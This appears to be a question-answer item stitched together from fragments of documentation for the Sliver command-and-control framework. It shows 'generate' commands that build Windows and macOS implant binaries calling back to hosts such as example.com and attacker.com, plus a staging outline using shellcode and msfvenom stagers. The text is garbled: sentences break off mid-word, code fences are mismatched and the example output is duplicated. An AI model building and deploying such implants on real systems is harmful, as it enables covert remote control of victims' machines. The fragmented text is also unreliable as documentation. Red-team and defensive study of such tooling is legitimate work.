```
sliver > generate --http example.com --os mac

[*] Generating new darwin/amd64 implant binary
[*] Build completed in 00:00:05
[*] Implant saved to /Users/moloch/Desktop/WORKING_HACIENDA
```
sliver > generate --http example.com/foo/bar

[*] Generating new windows/amd64 implant binary
[*] Build completed in 00:00:05
[*] Implant saved to /Users/moloch/Desktop/IMPRESSED_METHANE
Sliver implants are cross-platform, you can change the compiler target with the `--os` flag. Sliver accepts any Golang GOOS and GOARCH as arguments `--os` and `--arch`, we officially only support Windows, MacOS, and Linux, but you can at least attempt to compile for any other [valid Golang GOOS/GOARCH](https://gist.github.com/asukakenji/f15ba7e588ac42795f421b48b8aede63) combination. The `generate
If all you have is a Windows machine, the easiest way to build Sliver is using [WSL](https://docs.microsoft.com/en-us/windows/wsl/install-win10) and following the Linux/cross-compile instructions above. To cross-compile a native Windows binary use `make windows` and copy it to your Windows file system (i.e. `/mnt/c/Users/foo/Desktop`) and run it using a terminal that supports ANSI sequences such
```

# Sliver v1.5.x
For this to work, we need the following pieces:

- a staging server (the Sliver server)
- a stage 2 payload (usually a Sliver shellcode, but can be in other formats)
- stagers (generated by `msfvenom`, the Sliver `generate stager` command, or a custom one)

## Example
To load an alias in Sliver, use the `alias load` command:
```
sliver > builders
```
sliver > generate --http example.com,attacker.com

[*] Generating new windows/amd64 implant binary
[*] Build completed in 00:00:05
[*] Implant saved to /Users/moloch/Desktop/IMPRESSED_METHANE
```
sliver > generate --http foobar.com --canary 1.example.com.

Domanda: Inserisci una query : Give me an example of how to use the generate command in Sliver.
```
sliver > generate --http example.com --os mac

[*] Generating new darwin/amd64 implant binary
[*] Build completed in 00:00:05
[*] Implant saved to /Users/moloch/Desktop/WORKING_HACIENDA
```
sliver > generate --http example.com/foo/bar

[*] Generating new windows/amd64 implant binary
[*] Build completed in 00:00:05
[*] Implant saved to /Users/moloch/Desktop/IMPRESSED_METHANE
```